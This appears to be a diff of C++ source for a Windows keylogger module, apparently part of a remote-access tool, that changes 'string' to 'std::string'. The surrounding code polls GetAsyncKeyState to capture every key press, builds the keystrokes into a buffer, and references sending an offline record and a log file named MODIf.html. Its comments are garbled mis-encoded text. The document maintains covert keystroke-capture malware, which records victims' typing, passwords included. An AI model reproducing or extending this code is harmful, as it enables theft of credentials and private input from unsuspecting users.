@@ -11,7 +11,6 @@
 #include <iostream>
 #include <winbase.h>
 #include <winuser.h>
-using namespace std;
 
 #define FILE_PATH "\\MODIf.html"
 #define CAPTION_SIZE 1024
@@ -114,9 +113,9 @@ int CKeyboardManager1::sendOfflineRecord(DWORD	dwRead)
 }
 
 
-string GetKey(int Key) // ÅĞ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
+std::string GetKey(int Key) // ÅĞ¶Ï¼üÅÌ°´ÏÂÊ²Ã´¼ü
 {
-    string KeyString = "";
+    std::string KeyString = "";
     //ÅĞ¶Ï·ûºÅÊäÈë
     const int KeyPressMask=0x80000000; //¼üÅÌÑÚÂë³£Á¿
     int iShift=GetKeyState(0x10); //ÅĞ¶ÏShift¼ü×´Ì¬
@@ -496,7 +495,7 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
         }
         for(int i = 8; i <= 255; i++) {
             if((GetAsyncKeyState(i)&1) == 1) {
-                string TempString = GetKey (i);
+                std::string TempString = GetKey (i);
                 lstrcat(KeyBuffer,TempString.c_str());
             }
         }
